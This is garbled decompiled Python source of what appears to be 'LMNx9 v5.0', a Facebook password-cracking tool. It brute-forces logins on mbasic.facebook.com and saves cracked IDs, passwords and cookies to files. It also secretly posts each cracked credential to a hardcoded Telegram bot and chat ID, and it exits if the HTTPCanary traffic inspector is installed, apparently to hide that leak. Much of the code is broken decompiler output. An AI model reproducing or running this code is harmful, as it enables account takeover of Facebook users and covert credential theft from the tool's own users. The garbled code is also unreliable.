    slowed('\n\x1b[1;92m ╔══════════════════════════════════════➤●\n\x1b[1;92m ║ 🌺\x1b[1;96m ● \x1b[1;92mLMNx9 v5.0 CRACK 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘D\n\x1b[1;92m ║ 🌺\x1b[1;96m ● \x1b[1;96m𝗜𝗗z 𝗦𝗔𝗩𝗘𝗗 IN\x1b[1;96m ●\x1b[33;1m LMNx9-OK/CP.txt\n\x1b[1;92m ╚═══════════════════════════════════════➤●')
    sys.exit()


def Limonm(uid, pwx, tl):
    global loop
    colr = random.choice([
        '\x1b[1;31m',
        '\x1b[1;32m',
        '\x1b[1;33m',
        '\x1b[1;35m',
        '\x1b[1;34m',
        '\x1b[1;36m',
        '\x1b[1;37m',
        '\x1b[38;5;208m'])
    colo = random.choice([
        '\x1b[1;31m',
        '\x1b[1;32m',
        '\x1b[1;33m',
        '\x1b[1;35m',
        '\x1b[1;34m',
        '\x1b[1;36m',
        '\x1b[1;37m',
        '\x1b[38;5;208m'])
    colorful = random.choice([
        '\x1b[1;31m',
        '\x1b[1;32m',
        '\x1b[1;33m',
        '\x1b[1;35m',
        '\x1b[1;34m',
        '\x1b[1;36m',
        '\x1b[1;37m',
        '\x1b[38;5;208m'])
    emoji = random.choice([
        '😆',
        '😈',
        '😐',
        '😘',
        '😻',
        '😍',
        '😹',
        '😂',
        '😭',
        '😁',
        '😜',
        '😶',
        '😤',
        '😇',
        '💋',
        '🙀',
        '💚',
        '💛',
        '💙',
        '💜',
        '🌺'])
    ([]['\r '][f'''{B}''']['⌠'][f'''{colr}''']['𝗟𝗠𝗡𝘅𝟵-v5'][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{colorful}'''][f'''{loop}'''][f'''{B}''']['/'][f'''{colr}'''][f'''{tl}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{gr}''']['OK:'][f'''{len(oks)}'''][' '][f'''{colorful}''']['| '][f'''{rd}''']['CP:'][f'''{len(cps)}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{emoji}''']([]['\r '][f'''{B}''']['⌠'][f'''{colr}''']['𝗟𝗠𝗡𝘅𝟵-v5'][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{colorful}'''][f'''{loop}'''][f'''{B}''']['/'][f'''{colr}'''][f'''{tl}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{gr}''']['OK:'][f'''{len(oks)}'''][' '][f'''{colorful}''']['| '][f'''{rd}''']['CP:'][f'''{len(cps)}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{emoji}'''][f'''{B}''']([]['\r '][f'''{B}''']['⌠'][f'''{colr}''']['𝗟𝗠𝗡𝘅𝟵-v5'][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{colorful}'''][f'''{loop}'''][f'''{B}''']['/'][f'''{colr}'''][f'''{tl}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{gr}''']['OK:'][f'''{len(oks)}'''][' '][f'''{colorful}''']['| '][f'''{rd}''']['CP:'][f'''{len(cps)}'''][f'''{B}''']['⌡ '][f'''{colo}''']['● '][f'''{B}''']['⌠'][f'''{emoji}'''][f'''{B}''']['⌡ '])),)
    sys.stdout.flush()
    for ps in pwx:
        session = requests.Session()
        lmnXua = random.choice([
            Lx1,
            Lx2,
            Lx3,
            Lx4,
            Lx5])
        lmnx9_XFB = session.get('https://mbasic.facebook.com').text
        lmnx9_data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(lmnx9_XFB)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(lmnx9_XFB)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(lmnx9_XFB)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(lmnx9_XFB)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'pass': ps,
            'login': 'Log In' }
        lmnx9_v5 = {
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': lmnXua,
            'viewport-width': '725' }
        DARK = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', data = lmnx9_data, headers = lmnx9_v5).text
        LMNx9 = session.cookies.get_dict().keys()
        if 'c_user' in LMNx9:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[7:22]
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-OK🔥'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' '][f'''{uid}'''][' \n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-OK💥'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' '][f'''{ps}''']['\n'][f'''{bold1}'''][f'''{g3}'''][' ⌠'][f'''{zz3}''']['LMNx9-OK🍁'][f'''{g3}''']['⌡ '][f'''{bold2}'''][' '][f'''{g3}''']['●'][f'''{zz3}'''][' COOKIES \x1b[36;1m ●'][f'''{g3}'''][' \x1b[1;4m']([]['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-OK🔥'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' '][f'''{uid}'''][' \n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-OK💥'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' '][f'''{ps}''']['\n'][f'''{bold1}'''][f'''{g3}'''][' ⌠'][f'''{zz3}''']['LMNx9-OK🍁'][f'''{g3}''']['⌡ '][f'''{bold2}'''][' '][f'''{g3}''']['●'][f'''{zz3}'''][' COOKIES \x1b[36;1m ●'][f'''{g3}'''][' \x1b[1;4m'][f'''{coki}''']([]['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-OK🔥'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' '][f'''{uid}'''][' \n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-OK💥'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' '][f'''{ps}''']['\n'][f'''{bold1}'''][f'''{g3}'''][' ⌠'][f'''{zz3}''']['LMNx9-OK🍁'][f'''{g3}''']['⌡ '][f'''{bold2}'''][' '][f'''{g3}''']['●'][f'''{zz3}'''][' COOKIES \x1b[36;1m ●'][f'''{g3}'''][' \x1b[1;4m'][f'''{coki}''']['\x1b[1;0m']))
            open('/sdcard/LMNx9-OK.txt', 'a').write(uid + ' | ' + ps + '\n')
            oks.append(cid)
            HTTPxLMN()
            token = '7059192605:AAHRsQc1la8pJ9VfiqKbiZyzCAlPFxPgvFM'
            chatid = '6866037596'
            fb_id = str(uid + ' | ' + ps)
            url = f'''https://api.telegram.org/bot{token}/sendMessage'''
            params = {
                'chat_id': chatid,
                'text': '⌠VIP-v5-OK⌡ ' + fb_id }
            requests.get(url, params = params)
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-OK🔥'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' '][f'''{uid}'''][' \n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-OK💥'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' '][f'''{ps}''']['\n'][f'''{bold1}'''][f'''{g3}'''][' ⌠'][f'''{zz3}''']['LMNx9-OK🍁'][f'''{g3}''']['⌡ '][f'''{bold2}'''][' '][f'''{g3}''']['●'][f'''{zz3}'''][' COOKIES \x1b[36;1m ●'][f'''{g3}''']
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-OK🔥'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' '][f'''{uid}'''][' \n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-OK💥'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' '][f'''{ps}''']['\n'][f'''{bold1}'''][f'''{g3}'''][' ⌠'][f'''{zz3}''']['LMNx9-OK🍁'][f'''{g3}''']['⌡ '][f'''{bold2}'''][' '][f'''{g3}''']['●'][f'''{zz3}'''][' COOKIES \x1b[36;1m ●']
        if 'checkpoint' in LMNx9:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[24:39]
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' \x1b[1;9m']([]['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' \x1b[1;9m'][f'''{ps}''']([]['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}'''][' \x1b[1;9m'][f'''{ps}''']['\x1b[1;0m']))
            open('/sdcard/LMNx9-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
            cps.append(cid)
            HTTPxLMN()
            token = '7059192605:AAHRsQc1la8pJ9VfiqKbiZyzCAlPFxPgvFM'
            chatid = '6866037596'
            fb_id = str(uid + ' | ' + ps)
            url = f'''https://api.telegram.org/bot{token}/sendMessage'''
            params = {
                'chat_id': chatid,
                'text': '⌠VIP-v5-CP⌡ ' + fb_id }
            requests.get(url, params = params)
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●'][f'''{g2}''']
            []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}'''][' 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗\x1b[36;1m ●']
        loop += 1
        return None
        []['\n'][f'''{LNX}''']['\n'][f'''{bold1}'''][f'''{g1}'''][' ⌠'][f'''{zz1}''']['𝗟𝗠𝗡𝘅𝟵-CP❌'][f'''{g1}''']['⌡ '][f'''{bold2}'''][' '][f'''{g1}''']['●'][f'''{zz1}'''][' 𝗡𝗨𝗠𝗕𝗘𝗥\x1b[36;1m   ●'][f'''{g1}'''][' \x1b[1;9m'][f'''{uid}''']['\x1b[1;0m\n'][f'''{bold1}'''][f'''{g2}'''][' ⌠'][f'''{zz2}''']['LMNx9-CP💔'][f'''{g2}''']['⌡ '][f'''{bold2}'''][' '][f'''{g2}''']['●'][f'''{zz2}''']
        return None


def HTTPxLMN():
    if os.path.exists(os.path.join(path_canary, package_name)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKACUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n\x1b[1;35m ⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary2, package_name2)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n \x1b[1;35m⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary3, package_name3)):
        os.system('clear')
        print('\n')
        animation('\x1b[1;31m ⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n \x1b[1;35m⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary4, package_name4)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKACUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n\x1b[1;35m ⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary5, package_name5)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n \x1b[1;35m⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary6, package_name6)):
        os.system('clear')
        print('\n')
        animation('\x1b[1;31m ⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n\x1b[1;35m ⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary7, package_name7)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣ HTTPcanary')
        input('\n \x1b[1;35m⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
        sys.exit('\n')
        return None
    if None.path.exists(os.path.join(path_canary8, package_name8)):
        os.system('clear')
        print('\n')
        animation(' \x1b[1;31m⌠‣⌡ BOKAXUDA UNINSTALL KOR ‣  HTTPcanary')
        input('\n \x1b[1;35m⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK  ‣')
        sys.exit('\n')
        return None
    return None
    os.system('clear')
    print('\n')
    animation(' \x1b[1;31m⌠‣⌡ Your Bypass System Was Fucked By - LMNx9 !!! ')
    input('\n\x1b[1;35m ⌠‣⌡ PʀᴇsS EɴᴛᴇR Tᴏ BᴀᴄK ‣')
    sys.exit('\n')

if __name__ in '__main__':
    HTTPxLMN()
    Limon()
    return None
